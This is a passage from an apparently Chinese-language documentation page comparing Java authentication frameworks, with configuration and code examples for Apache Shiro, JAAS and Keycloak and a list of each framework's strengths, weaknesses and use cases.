\u5bc6\u7801\u5339\u914d\u5668\ncredentialsMatcher = org.apache.shiro.authc.credential.Sha256CredentialsMatcher\nmyRealm.credentialsMatcher = $credentialsMatcher\n\n# \u7f13\u5b58\u7ba1\u7406\u5668\ncacheManager = org.apache.shiro.cache.ehcache.EhCacheManager\nsecurityManager.cacheManager = $cacheManager\n\n[urls]\n# URL\u6743\u9650\u914d\u7f6e\n/login = anon\n/logout = logout\n/public/** = anon\n/admin/** = authc, roles[admin]\n/api/** = authc\n/** = authc\n</code></pre></p> <p>Shiro\u914d\u7f6e\u7c7b\uff1a <pre><code>/**\n * Shiro\u914d\u7f6e\n */\n@Configuration\npublic class ShiroConfig {\n\n    /**\n     * Shiro\u8fc7\u6ee4\u5668\n     */\n    @Bean\n    public ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager) {\n        ShiroFilterFactoryBean filterFactory = new ShiroFilterFactoryBean();\n        filterFactory.setSecurityManager(securityManager);\n\n        // \u767b\u5f55URL\n        filterFactory.setLoginUrl(\"/login\");\n        // \u6210\u529fURL\n        filterFactory.setSuccessUrl(\"/index\");\n        // \u672a\u6388\u6743URL\n        filterFactory.setUnauthorizedUrl(\"/403\");\n\n        // \u5b9a\u4e49\u8fc7\u6ee4\u89c4\u5219\n        Map&lt;String, String&gt; filterChainMap = new LinkedHashMap&lt;&gt;();\n        filterChainMap.put(\"/login\", \"anon\");\n        filterChainMap.put(\"/logout\", \"logout\");\n        filterChainMap.put(\"/static/**\", \"anon\");\n        filterChainMap.put(\"/admin/**\", \"authc,roles[admin]\");\n        filterChainMap.put(\"/user/**\", \"authc,roles[user]\");\n        filterChainMap.put(\"/**\", \"authc\");\n\n        filterFactory.setFilterChainDefinitionMap(filterChainMap);\n\n        return filterFactory;\n    }\n\n    /**\n     * SecurityManager\n     */\n    @Bean\n    public SecurityManager securityManager(Realm realm) {\n        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();\n        securityManager.setRealm(realm);\n        return securityManager;\n    }\n\n    /**\n     * \u81ea\u5b9a\u4e49Realm\n     */\n    @Bean\n    public Realm realm() {\n        CustomRealm realm = new CustomRealm();\n        realm.setCredentialsMatcher(hashedCredentialsMatcher());\n        return realm;\n    }\n\n    /**\n     * \u5bc6\u7801\u5339\u914d\u5668\n     */\n    @Bean\n    public HashedCredentialsMatcher hashedCredentialsMatcher() {\n        HashedCredentialsMatcher matcher = new HashedCredentialsMatcher();\n        matcher.setHashAlgorithmName(\"SHA-256\");\n        matcher.setHashIterations(1024);\n        matcher.setStoredCredentialsHexEncoded(true);\n        return matcher;\n    }\n\n    /**\n     * \u542f\u7528Shiro\u6ce8\u89e3\n     */\n    @Bean\n    public AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor(\n            SecurityManager securityManager) {\n        AuthorizationAttributeSourceAdvisor advisor = new AuthorizationAttributeSourceAdvisor();\n        advisor.setSecurityManager(securityManager);\n        return advisor;\n    }\n}\n</code></pre></p> <p>\u81ea\u5b9a\u4e49Realm\uff1a <pre><code>/**\n * \u81ea\u5b9a\u4e49Realm\n */\npublic class CustomRealm extends AuthorizingRealm {\n\n    @Autowired\n    private UserService userService;\n\n    /**\n     * \u6388\u6743\n     */\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {\n        String username = (String) principals.getPrimaryPrincipal();\n        User user = userService.findByUsername(username);\n\n        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();\n\n        // \u6dfb\u52a0\u89d2\u8272\n        info.setRoles(user.getRoles());\n\n        // \u6dfb\u52a0\u6743\u9650\n        info.setStringPermissions(user.getPermissions());\n\n        return info;\n    }\n\n    /**\n     * \u8ba4\u8bc1\n     */\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) \n            throws AuthenticationException {\n\n        UsernamePasswordToken upToken = (UsernamePasswordToken) token;\n        String username = upToken.getUsername();\n\n        User user = userService.findByUsername(username);\n        if (user == null) {\n            throw new UnknownAccountException(\"\u7528\u6237\u4e0d\u5b58\u5728\");\n        }\n\n        if (user.isLocked()) {\n            throw new LockedAccountException(\"\u8d26\u6237\u5df2\u9501\u5b9a\");\n        }\n\n        // \u8fd4\u56de\u8ba4\u8bc1\u4fe1\u606f\n        // Shiro\u4f1a\u81ea\u52a8\u6bd4\u8f83\u5bc6\u7801\n        return new SimpleAuthenticationInfo(\n            username,                    // principal\n            user.getPassword(),          // credentials\n            ByteSource.Util.bytes(user.getSalt()), // salt\n            getName()                    // realm name\n        );\n    }\n}\n</code></pre></p> <p>\u4f7f\u7528\u793a\u4f8b\uff1a <pre><code>/**\n * \u767b\u5f55\u63a7\u5236\u5668\n */\n@Controller\npublic class LoginController {\n\n    @PostMapping(\"/login\")\n    public String login(@RequestParam String username, \n                       @RequestParam String password) {\n        Subject subject = SecurityUtils.getSubject();\n        UsernamePasswordToken token = new UsernamePasswordToken(username, password);\n        token.setRememberMe(true);\n\n        try {\n            subject.login(token);\n            return \"redirect:/index\";\n        } catch (UnknownAccountException e) {\n            return \"redirect:/login?error=unknown\";\n        } catch (IncorrectCredentialsException e) {\n            return \"redirect:/login?error=password\";\n        } catch (LockedAccountException e) {\n            return \"redirect:/login?error=locked\";\n        }\n    }\n\n    @GetMapping(\"/logout\")\n    public String logout() {\n        Subject subject = SecurityUtils.getSubject();\n        subject.logout();\n        return \"redirect:/login\";\n    }\n}\n\n/**\n * \u4f7f\u7528\u6ce8\u89e3\u8fdb\u884c\u6743\u9650\u63a7\u5236\n */\n@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n\n    @RequiresAuthentication  // \u9700\u8981\u8ba4\u8bc1\n    @GetMapping(\"/me\")\n    public User getCurrentUser() {\n        Subject subject = SecurityUtils.getSubject();\n        String username = (String) subject.getPrincipal();\n        return userService.findByUsername(username);\n    }\n\n    @RequiresRoles(\"admin\")  // \u9700\u8981admin\u89d2\u8272\n    @GetMapping\n    public List&lt;User&gt; getAllUsers() {\n        return userService.findAll();\n    }\n\n    @RequiresPermissions(\"user:delete\")  // \u9700\u8981user:delete\u6743\u9650\n    @DeleteMapping(\"/{id}\")\n    public void deleteUser(@PathVariable Long id) {\n        userService.delete(id);\n    }\n\n    // \u7f16\u7a0b\u5f0f\u6743\u9650\u68c0\u67e5\n    @PostMapping(\"/{id}/activate\")\n    public void activateUser(@PathVariable Long id) {\n        Subject subject = SecurityUtils.getSubject();\n\n        if (subject.hasRole(\"admin\") || subject.isPermitted(\"user:activate\")) {\n            userService.activate(id);\n        } else {\n            throw new UnauthorizedException(\"\u6ca1\u6709\u6743\u9650\");\n        }\n    }\n}\n</code></pre></p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_13","title":"\u6743\u9650\u5b57\u7b26\u4e32","text":"<p>Shiro\u4f7f\u7528\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u8868\u793a\u6743\u9650\uff0c\u652f\u6301\u901a\u914d\u7b26\uff1a</p> <pre><code>// \u683c\u5f0f: resource:action:instance\n\n// \u793a\u4f8b\n\"user:create\"           // \u521b\u5efa\u7528\u6237\n\"user:update:123\"       // \u66f4\u65b0ID\u4e3a123\u7684\u7528\u6237\n\"user:*\"               // \u7528\u6237\u7684\u6240\u6709\u64cd\u4f5c\n\"user:*:123\"           // \u5bf9ID\u4e3a123\u7684\u7528\u6237\u7684\u6240\u6709\u64cd\u4f5c\n\"*:view\"               // \u67e5\u770b\u6240\u6709\u8d44\u6e90\n\"*\"                    // \u6240\u6709\u6743\u9650\n\n// \u68c0\u67e5\u6743\u9650\nsubject.isPermitted(\"user:create\");\nsubject.isPermitted(\"user:update:123\");\nsubject.isPermittedAll(\"user:view\", \"user:create\");\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_14","title":"\u4f18\u7f3a\u70b9","text":"<p>\u4f18\u70b9\uff1a - \u2705 \u7b80\u5355\u6613\u5b66\uff0c\u4e0a\u624b\u5feb - \u2705 \u8f7b\u91cf\u7ea7\uff0c\u65e0\u4f9d\u8d56Spring - \u2705 \u7075\u6d3b\u7684\u6743\u9650\u6a21\u578b - \u2705 \u826f\u597d\u7684\u4f1a\u8bdd\u7ba1\u7406 - \u2705 \u652f\u6301\u591a\u79cd\u6570\u636e\u6e90 - \u2705 \u4ee3\u7801\u4fb5\u5165\u6027\u5c0f</p> <p>\u7f3a\u70b9\uff1a - \u274c \u793e\u533a\u4e0d\u5982Spring Security\u6d3b\u8dc3 - \u274c OAuth2/OIDC\u652f\u6301\u8f83\u5f31 - \u274c \u73b0\u4ee3\u534f\u8bae\u652f\u6301\u6709\u9650 - \u274c \u66f4\u65b0\u9891\u7387\u8f83\u4f4e - \u274c \u4e0eSpring Boot\u96c6\u6210\u4e0d\u5982Spring Security\u987a\u6ed1</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_15","title":"\u9002\u7528\u573a\u666f","text":"<ul> <li>\u72ec\u7acb\u7684Java\u5e94\u7528</li> <li>\u7b80\u5355\u7684Web\u5e94\u7528</li> <li>\u4e0d\u4f7f\u7528Spring\u7684\u9879\u76ee</li> <li>\u5bf9\u5b89\u5168\u9700\u6c42\u4e0d\u592a\u590d\u6742\u7684\u573a\u666f</li> <li>\u9700\u8981\u7075\u6d3b\u6743\u9650\u6a21\u578b\u7684\u9879\u76ee</li> </ul>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#jaas","title":"JAAS","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_16","title":"\u6982\u8ff0","text":"<p>JAAS (Java Authentication and Authorization Service) \u662fJava\u6807\u51c6\u5e73\u53f0\u7684\u4e00\u90e8\u5206\uff0c\u63d0\u4f9b\u4e86\u57fa\u7840\u7684\u8ba4\u8bc1\u548c\u6388\u6743API\u3002</p> <p>\u5b98\u7f51\uff1a https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaas/JAASRefGuide.html</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_17","title":"\u6838\u5fc3\u6982\u5ff5","text":"<pre><code>LoginContext\n    \u2502\n    \u251c\u2500 LoginModule (\u8ba4\u8bc1\u6a21\u5757)\n    \u2502       \u2502\n    \u2502       \u251c\u2500 JndiLoginModule\n    \u2502       \u251c\u2500 Krb5LoginModule\n    \u2502       \u2514\u2500 Custom LoginModule\n    \u2502\n    \u2514\u2500 Subject (\u8ba4\u8bc1\u4e3b\u4f53)\n            \u2502\n            \u251c\u2500 Principals (\u8eab\u4efd)\n            \u2514\u2500 Credentials (\u51ed\u8bc1)\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_18","title":"\u914d\u7f6e\u793a\u4f8b","text":"<p>JAAS\u914d\u7f6e\u6587\u4ef6\uff08jaas.conf\uff09\uff1a <pre><code>MyApp {\n    com.example.MyLoginModule required\n        debug=true\n        userDatabase=\"users.properties\";\n\n    com.sun.security.auth.module.Krb5LoginModule optional\n        useTicketCache=true;\n};\n</code></pre></p> <p>\u81ea\u5b9a\u4e49LoginModule\uff1a <pre><code>/**\n * \u81ea\u5b9a\u4e49\u767b\u5f55\u6a21\u5757\n */\npublic class MyLoginModule implements LoginModule {\n\n    private Subject subject;\n    private CallbackHandler callbackHandler;\n    private Map&lt;String, ?&gt; sharedState;\n    private Map&lt;String, ?&gt; options;\n\n    private boolean succeeded = false;\n    private boolean commitSucceeded = false;\n    private String username;\n    private char[] password;\n    private Principal userPrincipal;\n\n    @Override\n    public void initialize(Subject subject, CallbackHandler callbackHandler,\n                          Map&lt;String, ?&gt; sharedState, Map&lt;String, ?&gt; options) {\n        this.subject = subject;\n        this.callbackHandler = callbackHandler;\n        this.sharedState = sharedState;\n        this.options = options;\n    }\n\n    @Override\n    public boolean login() throws LoginException {\n        // \u521b\u5efa\u56de\u8c03\u83b7\u53d6\u7528\u6237\u540d\u548c\u5bc6\u7801\n        NameCallback nameCallback = new NameCallback(\"Username: \");\n        PasswordCallback passwordCallback = new PasswordCallback(\"Password: \", false);\n\n        try {\n            callbackHandler.handle(new Callback[]{nameCallback, passwordCallback});\n            username = nameCallback.getName();\n            password = passwordCallback.getPassword();\n            passwordCallback.clearPassword();\n\n            // \u9a8c\u8bc1\u7528\u6237\u540d\u548c\u5bc6\u7801\n            if (authenticate(username, password)) {\n                succeeded = true;\n                return true;\n            } else {\n                throw new FailedLoginException(\"\u8ba4\u8bc1\u5931\u8d25\");\n            }\n        } catch (IOException | UnsupportedCallbackException e) {\n            throw new LoginException(e.getMessage());\n        }\n    }\n\n    @Override\n    public boolean commit() throws LoginException {\n        if (!succeeded) {\n            return false;\n        }\n\n        // \u521b\u5efaPrincipal\u5e76\u6dfb\u52a0\u5230Subject\n        userPrincipal = new UserPrincipal(username);\n        subject.getPrincipals().add(userPrincipal);\n\n        // \u6e05\u9664\u5bc6\u7801\n        username = null;\n        Arrays.fill(password, ' ');\n        password = null;\n\n        commitSucceeded = true;\n        return true;\n    }\n\n    @Override\n    public boolean abort() throws LoginException {\n        if (!succeeded) {\n            return false;\n        } else if (succeeded &amp;&amp; !commitSucceeded) {\n            // \u767b\u5f55\u6210\u529f\u4f46\u63d0\u4ea4\u5931\u8d25\n            succeeded = false;\n            username = null;\n            if (password != null) {\n                Arrays.fill(password, ' ');\n                password = null;\n            }\n            userPrincipal = null;\n        } else {\n            // \u63d0\u4ea4\u6210\u529f\uff0c\u8c03\u7528logout\n            logout();\n        }\n        return true;\n    }\n\n    @Override\n    public boolean logout() throws LoginException {\n        subject.getPrincipals().remove(userPrincipal);\n        succeeded = false;\n        commitSucceeded = false;\n        username = null;\n        if (password != null) {\n            Arrays.fill(password, ' ');\n            password = null;\n        }\n        userPrincipal = null;\n        return true;\n    }\n\n    private boolean authenticate(String username, char[] password) {\n        // \u5b9e\u73b0\u8ba4\u8bc1\u903b\u8f91\n        return true;\n    }\n}\n\n/**\n * \u7528\u6237Principal\n */\npublic class UserPrincipal implements Principal, Serializable {\n    private final String name;\n\n    public UserPrincipal(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String getName() {\n        return name;\n    }\n}\n</code></pre></p> <p>\u4f7f\u7528JAAS\u8fdb\u884c\u8ba4\u8bc1\uff1a <pre><code>/**\n * JAAS\u8ba4\u8bc1\u793a\u4f8b\n */\npublic class JAASExample {\n\n    public static void main(String[] args) {\n        // \u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6\n        System.setProperty(\"java.security.auth.login.config\", \"jaas.conf\");\n\n        try {\n            // \u521b\u5efaLoginContext\n            LoginContext lc = new LoginContext(\"MyApp\", new MyCallbackHandler());\n\n            // \u6267\u884c\u767b\u5f55\n            lc.login();\n\n            // \u83b7\u53d6\u8ba4\u8bc1\u7684Subject\n            Subject subject = lc.getSubject();\n            System.out.println(\"\u8ba4\u8bc1\u6210\u529f: \" + subject.getPrincipals());\n\n            // \u4ee5\u7279\u5b9aSubject\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\n            Subject.doAs(subject, (PrivilegedAction&lt;Void&gt;) () -&gt; {\n                // \u6267\u884c\u9700\u8981\u8ba4\u8bc1\u7684\u64cd\u4f5c\n                System.out.println(\"\u5f53\u524d\u7528\u6237: \" + Subject.getSubject(AccessController.getContext()));\n                return null;\n            });\n\n            // \u767b\u51fa\n            lc.logout();\n\n        } catch (LoginException e) {\n            System.err.println(\"\u8ba4\u8bc1\u5931\u8d25: \" + e.getMessage());\n        }\n    }\n}\n\n/**\n * \u81ea\u5b9a\u4e49CallbackHandler\n */\npublic class MyCallbackHandler implements CallbackHandler {\n\n    @Override\n    public void handle(Callback[] callbacks) throws IOException, UnsupportedCallbackException {\n        for (Callback callback : callbacks) {\n            if (callback instanceof NameCallback) {\n                NameCallback nc = (NameCallback) callback;\n                nc.setName(\"user\");\n            } else if (callback instanceof PasswordCallback) {\n                PasswordCallback pc = (PasswordCallback) callback;\n                pc.setPassword(\"password\".toCharArray());\n            } else {\n                throw new UnsupportedCallbackException(callback, \"Unsupported callback\");\n            }\n        }\n    }\n}\n</code></pre></p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_19","title":"\u4f18\u7f3a\u70b9","text":"<p>\u4f18\u70b9\uff1a - \u2705 Java\u6807\u51c6API\uff0c\u65e0\u9700\u989d\u5916\u4f9d\u8d56 - \u2705 \u53ef\u63d2\u62d4\u7684\u8ba4\u8bc1\u6a21\u5757 - \u2705 \u9002\u5408Java SE\u5e94\u7528 - \u2705 \u4e0eJVM\u5b89\u5168\u6a21\u578b\u6df1\u5ea6\u96c6\u6210</p> <p>\u7f3a\u70b9\uff1a - \u274c API\u8f83\u4e3a\u5e95\u5c42\uff0c\u4f7f\u7528\u590d\u6742 - \u274c \u7f3a\u5c11\u73b0\u4ee3Web\u5b89\u5168\u7279\u6027 - \u274c \u6ca1\u6709\u5185\u7f6e\u7684\u6388\u6743\u7ba1\u7406 - \u274c \u793e\u533a\u652f\u6301\u6709\u9650 - \u274c \u4e0d\u9002\u5408Web\u5e94\u7528</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_20","title":"\u9002\u7528\u573a\u666f","text":"<ul> <li>Java SE\u684c\u9762\u5e94\u7528</li> <li>\u9700\u8981\u4e0eJVM\u5b89\u5168\u6a21\u578b\u96c6\u6210</li> <li>\u4f01\u4e1a\u73af\u5883\uff08Kerberos\u8ba4\u8bc1\uff09</li> <li>\u9057\u7559\u7cfb\u7edf\u7ef4\u62a4</li> </ul>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#keycloak","title":"Keycloak","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_21","title":"\u6982\u8ff0","text":"<p>Keycloak \u662fRedHat\u5f00\u6e90\u7684\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\uff08IAM\uff09\u89e3\u51b3\u65b9\u6848\uff0c\u63d0\u4f9b\u5b8c\u6574\u7684\u8ba4\u8bc1\u3001\u6388\u6743\u3001\u7528\u6237\u7ba1\u7406\u529f\u80fd\u3002</p> <p>\u5b98\u7f51\uff1a https://www.keycloak.org/</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_22","title":"\u6838\u5fc3\u7279\u6027","text":"<ol> <li>\u5355\u70b9\u767b\u5f55\uff08SSO\uff09</li> <li>OAuth 2.0</li> <li>OpenID Connect</li> <li> <p>SAML 2.0</p> </li> <li> <p>\u8eab\u4efd\u4ee3\u7406\uff08Identity Brokering\uff09</p> </li> <li>\u96c6\u6210\u5916\u90e8IdP\uff08Google\u3001Facebook\u3001GitHub\u7b49\uff09</li> <li> <p>LDAP/Active Directory\u96c6\u6210</p> </li> <li> <p>\u7528\u6237\u8054\u90a6\uff08User Federation\uff09</p> </li> <li>LDAP/AD\u540c\u6b65</li> <li> <p>\u81ea\u5b9a\u4e49\u7528\u6237\u5b58\u50a8</p> </li> <li> <p>\u7ba1\u7406\u529f\u80fd</p> </li> <li>Web\u7ba1\u7406\u63a7\u5236\u53f0</li> <li>\u7528\u6237\u7ba1\u7406</li> <li>\u89d2\u8272\u548c\u6743\u9650\u7ba1\u7406</li> <li> <p>\u5ba2\u6237\u7aef\u7ba1\u7406</p> </li> <li> <p>\u5b89\u5168\u7279\u6027</p> </li> <li>\u591a\u56e0\u7d20\u8ba4\u8bc1\uff08MFA\uff09</li> <li>\u5bc6\u7801\u7b56\u7565</li> <li>\u4f1a\u8bdd\u7ba1\u7406</li> <li>\u66b4\u529b\u7834\u89e3\u9632\u62a4</li> </ol>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_23","title":"\u67b6\u6784","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                 Keycloak Server                       \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502  \u2502          Admin Console (\u7ba1\u7406\u754c\u9762)               \u2502  \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502  \u2502     Authentication SPI (\u8ba4\u8bc1\u670d\u52a1)               \u2502  \u2502\n\u2502  \u2502  OAuth2 | OIDC | SAML | Custom                 \u2502  \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502  \u2502         User Storage SPI (\u7528\u6237\u5b58\u50a8)             \u2502  \u2502\n\u2502  \u2502  Database | LDAP | Custom                       \u2502  \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502  \u2502        Identity Provider (\u8eab\u4efd\u63d0\u4f9b\u8005)           \u2502  \u2502\n\u2502  \u2502  Google | Facebook | GitHub | SAML             \u2502  \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                      \u2502\n        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u25bc             \u25bc             \u25bc\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 App A \u2502    \u2502 App B \u2502    \u2502 App C \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_24","title":"\u5feb\u901f\u5f00\u59cb","text":"<p>1. \u4f7f\u7528Docker\u542f\u52a8Keycloak\uff1a <pre><code>docker run -d \\\n  --name keycloak \\\n  -p 8080:8080 \\\n  -e KEYCLOAK_ADMIN=admin \\\n  -e KEYCLOAK_ADMIN_PASSWORD=admin \\\n  quay.io/keycloak/keycloak:latest \\\n  start-dev\n</code></pre></p> <p>2. \u8bbf\u95ee\u7ba1\u7406\u63a7\u5236\u53f0\uff1a <pre><code>URL: http://localhost:8080\n\u7528\u6237\u540d: admin\n\u5bc6\u7801: admin\n</code></pre></p> <p>3. \u521b\u5efaRealm\u3001Client\u3001User</p> <p>4. Spring Boot\u96c6\u6210\uff1a</p> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;\n    &lt;artifactId&gt;keycloak-spring-boot-starter&lt;/artifactId&gt;\n    &lt;version&gt;23.0.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code># application.yml\nkeycloak:\n  realm: myrealm\n  auth-server-url: http://localhost:8080\n  resource: my-app\n  credentials:\n    secret: your-client-secret\n  use-resource-role-mappings: true\n  bearer-only: true\n\nspring:\n  security:\n    oauth2:\n      client:\n        registration:\n          keycloak:\n            client-id: my-app\n            client-secret: your-client-secret\n            scope: openid,profile,email\n            authorization-grant-type: authorization_code\n            redirect-uri: \"{baseUrl}/login/oauth2/code/keycloak\"\n        provider:\n          keycloak:\n            issuer-uri: http://localhost:8080/realms/myrealm\n            user-name-attribute: preferred_username\n</code></pre> <pre><code>/**\n * Keycloak\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\npublic class KeycloakSecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/public/**\").permitAll()\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                .anyRequest().authenticated()\n            )\n            .oauth2Login(Customizer.withDefaults())\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(Customizer.withDefaults())\n            );\n\n        return http.build();\n    }\n}\n\n/**\n * \u4f7f\u7528Keycloak\u7528\u6237\u4fe1\u606f\n */\n@RestController\npublic class UserController {\n\n    @GetMapping(\"/api/me\")\n    public Map&lt;String, Object&gt; getCurrentUser(@AuthenticationPrincipal OidcUser user) {\n        Map&lt;String, Object&gt; userInfo = new HashMap&lt;&gt;();\n        userInfo.put(\"username\", user.getPreferredUsername());\n        userInfo.put(\"email\", user.getEmail());\n        userInfo.put(\"name\", user.getFullName());\n        userInfo.put(\"roles\", user.getAuthorities());\n        return userInfo;\n    }\n}\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_25","title":"\u4f18\u7f3a\u70b9","text":"<p>\u4f18\u70b9\uff1a - \u2705 \u529f\u80fd\u5168\u9762\uff0c\u5f00\u7bb1\u5373\u7528 - \u2705 \u5b8c\u6574\u7684\u7ba1\u7406\u754c\u9762 - \u2705 \u652f\u6301\u591a\u79cd\u534f\u8bae - \u2705 \u5f3a\u5927\u7684\u7528\u6237\u7ba1\u7406 - \u2705 